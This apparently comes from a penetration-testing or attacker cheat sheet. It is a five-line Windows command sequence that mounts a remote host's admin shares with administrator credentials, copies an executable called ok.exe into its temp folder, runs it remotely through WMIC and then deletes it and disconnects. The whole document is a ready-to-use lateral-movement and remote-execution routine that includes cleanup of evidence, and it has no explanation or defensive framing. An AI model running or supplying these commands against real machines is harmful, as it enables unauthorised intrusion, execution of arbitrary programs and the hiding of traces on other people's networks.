	>net use \\192.168.0.55\ipc$ "password" /user:"domain\administrator"
	>copy ok.exe \\192.168.0.55\c$\windows\temp
	>wmic /NODE:" 192.168.0.55" /user:"administrator" /password:"password" PROCESS call create "c:\windows\temp\ok.exe"
	>del \\192.168.0.55\c$\windows\temp\ok.exe /F
	>net use \\192.168.0.55\c$ /del
